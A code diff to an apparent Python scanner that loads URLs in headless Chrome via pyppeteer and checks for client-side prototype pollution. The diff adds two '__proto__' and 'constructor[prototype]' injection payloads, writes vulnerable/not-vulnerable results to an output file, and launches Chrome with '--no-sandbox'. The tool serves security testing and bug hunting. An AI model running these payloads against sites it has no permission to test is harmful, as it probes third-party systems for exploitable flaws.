@@ -24,6 +24,8 @@ user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 payloads = [
     "__proto__[property]=value",
     "__proto__.property.=value",
+    "__proto__.property.__proto__.property.=value",
+    "[constructor][prototype][property]=value",
     "constructor.prototype.property=value",
     "constructor[prototype][property]=value",
     "constructor[prototype].property=value",
@@ -64,7 +66,7 @@ async def close_dialog(dialog):
     await dialog.dismiss()
     return
 
-async def do_req(browser, url, payload, semaphore):
+async def do_req(browser, url, payload, semaphore,output_file):
     async with semaphore:
 
         payload = payload.replace("property",prop)
@@ -92,16 +94,19 @@ async def do_req(browser, url, payload, semaphore):
 
             pollution = await new_tab.evaluate(prop)
             if pollution == val:
+                output_file.write(f"[*] Vulnerable, {url}\n")
                 sys.stdout.write(f"{GREEN}[*] Vulnerable, {url} \n{RESET}")    
 
             await new_tab.close()
 
         except pyppeteer.errors.ElementHandleError:
+            output_file.write(f"[!] Not vulnerable, {url} \n")
             sys.stdout.write(f"{RED}[!] Not vulnerable, {url} \n{RESET}")    
             await new_tab.close()
 
         except:
             sys.stdout.write(f"{RED}[!] Something went wrong when performing, {url} \n{RESET}")    
+            output_file.write(f"[!] Something went wrong when performing, {url} \n")    
             await new_tab.close()
     return
 
@@ -110,10 +115,12 @@ async def main(urls):
     semaphore= asyncio.Semaphore(args.concurrency)
     tasks = []
 
+    output_file = open(args.output,"w")
+
     # one browser multiple tags
     browser = await launch({
         "ignoreHTTPSErrors": True,
-        "args": ["--ignore-certificate-errors"],
+        "args": ["--ignore-certificate-errors","--no-sandbox"],
         "headless" : not args.debug
     })
 
@@ -121,14 +128,16 @@ async def main(urls):
     for url in urls:
         for payload in payloads:
             if has_param(url):
-                tasks.append(do_req(browser,url,payload,semaphore))
+                tasks.append(do_req(browser,url,payload,semaphore,output_file))
             else:
                 # it looks ugly but idc
                 for i in ["?","#"]:
-                    tasks.append(do_req(browser,url+i,payload,semaphore))
+                    tasks.append(do_req(browser,url+i,payload,semaphore,output_file))
     
     await asyncio.wait(tasks)
     #time.sleep(10000)
+
+    output_file.close()
     await browser.close()
 
 
@@ -140,8 +149,8 @@ if __name__ == "__main__":
     parser.add_argument("-u", "--url", dest="url",help="Single url")
     parser.add_argument("-c", "--concurrency", dest="concurrency",type=int,help="Concurrency", default=10)
     parser.add_argument("-d", "--debug", dest="debug", help="Starts chrome without being headless", action="store_true", default=False)
-    parser.add_argument("-f", "--fuzz-keyword", dest="keyword", help="Fuzzes the keyword", default="FUZZ")
-    
+    parser.add_argument("-f", "--fuzz-keyword", dest="keyword", help="Fuzzes the keyword, ex: -f BUZZ", default="FUZZ")
+    parser.add_argument("-o", "--output", dest="output", help="Output file, ex: -o foo.txt")
 
 
     args = parser.parse_args()
